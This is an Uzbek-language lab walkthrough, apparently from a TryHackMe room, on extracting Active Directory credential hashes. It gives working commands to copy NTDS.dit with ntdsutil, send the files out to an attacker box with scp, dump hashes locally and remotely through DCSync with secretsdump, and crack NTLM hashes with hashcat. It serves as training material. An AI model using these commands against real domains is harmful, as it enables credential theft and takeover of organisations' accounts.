## **NTDS Domain Controller (Domen Controller Hashlarini olish)**

**NTDS (New Technologies Directory Services)** — bu Active Directory ma'lumotlar bazasi bo‘lib, u barcha AD ma’lumotlarini o‘z ichiga oladi: obyektlar, atributlar, parollar va boshqalar. `NTDS.dit` faylida uchta asosiy jadval mavjud:

* **Schema table**: obyekt turlari va ularning o‘zaro bog‘liqliklarini saqlaydi.
* **Link table**: obyekt atributlari va ularning qiymatlarini saqlaydi.
* **Data table**: foydalanuvchilar va guruhlarni saqlaydi.

Ushbu fayl odatda `C:\Windows\NTDS` katalogida joylashgan bo‘ladi va shifrlangan holatda saqlanadi. NTDS.dit fayliga ishlayotgan tizimda to‘g‘ridan-to‘g‘ri murojaat qilib bo‘lmaydi, chunki u Active Directory tomonidan band qilingan.

Lekin ushbu fayl nusxasini olish uchun turli usullar mavjud. Ushbu topshiriqda **ntdsutil** va **Diskshadow** vositalari orqali fayl nusxasini olish, keyin esa ushbu fayl tarkibini parollarni yechish orqali o‘rganish usullari tushuntiriladi.

**Muhim:** NTDS faylini yechish uchun **SYSTEM** va **SECURITY** fayllari ham kerak bo‘ladi, chunki ularda Boot Key (yuklash kaliti) saqlanadi.

---

### **Ntdsutil vositasi**

**Ntdsutil** — Active Directory konfiguratsiyasini boshqarish uchun Windows’ning ichki vositasi. U quyidagilar uchun ishlatiladi:

* O‘chirilgan obyektlarni tiklash
* AD bazasini texnik xizmat ko‘rsatish
* AD snapshotlarni boshqarish
* DSRM admin parolini sozlash

---

## 🖥️ **Lokal Dumping (Kirish ma’lumotsiz)**

Agar sizda hech qanday foydalanuvchi ma’lumoti bo‘lmasa, lekin **Domain Controller** ustidan **administrator huquqlari** bo‘lsa — quyidagicha fayllarni olish mumkin.

### **Kerakli Fayllar:**

* `C:\Windows\NTDS\ntds.dit`
* `C:\Windows\System32\config\SYSTEM`
* `C:\Windows\System32\config\SECURITY`

### **NTDS faylini olish uchun PowerShell buyruq:**

```powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

`C:\temp` katalogida `Active Directory` va `registry` papkalari yaratiladi, va yuqoridagi 3 faylni ichida topasiz.

Bu fayllarni **AttackBox**’ga uzating va quyidagi buyruq bilan **hashlar**ni yeching:

```bash
python3.9 /opt/impacket/examples/secretsdump.py \
  -security path/to/SECURITY \
  -system path/to/SYSTEM \
  -ntds path/to/ntds.dit \
  local
```

Olib chiqish:
```
scp .\SYSTEM .\SECURITY root@10.201.37.104:/root/Desktop/
```

---

## 🌐 **Masofaviy Dumping (Kirish ma’lumotlari bilan)**

Agar sizda **admin huquqiga ega foydalanuvchi ma’lumoti (parol yoki NTLM hash)** bo‘lsa, **Domain Controller**’dan masofadan ham hashlarni olishingiz mumkin.

---

### **DC Sync (Domain Controller Sync) hujumi**

Bu mashhur usul bo‘lib, maxsus ruxsatlarga ega bo‘lgan foydalanuvchi orqali amalga oshiriladi. Quyidagi AD ruxsatlar zarur:

* Replicating Directory Changes
* Replicating Directory Changes All
* Replicating Directory Changes in Filtered Set

Bu ruxsatlar orqali xaker domen replikatsiyasini (ya’ni, AD nusxalash) amalga oshiradi.

### **Impacket orqali DC Sync qilish:**

```bash
python3.9 /opt/impacket/examples/secretsdump.py \
  -just-dc THM.red/<AD_Admin_User>@10.201.112.212
```

* `-just-dc` → faqat NTDS ma'lumotlarini olish uchun ishlatiladi
* `THM.red/AD_Admin_User` → domen va foydalanuvchi (masalan: red/administrator)

### **Faqat NTLM hashlarni olish uchun:**

```bash
python3.9 /opt/impacket/examples/secretsdump.py \
  -just-dc-ntlm THM.red/<AD_Admin_User>@10.201.112.212
```

---

## 🔓 **Hashlarni Cracking qilish (parolni ochish)**

Olingan NTLM hashlarni **hashcat** yordamida buzishingiz mumkin. Windows NTLM hashlar uchun `-m 1000` rejimi ishlatiladi:

```bash
hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt /path/to/rockyou.txt
```
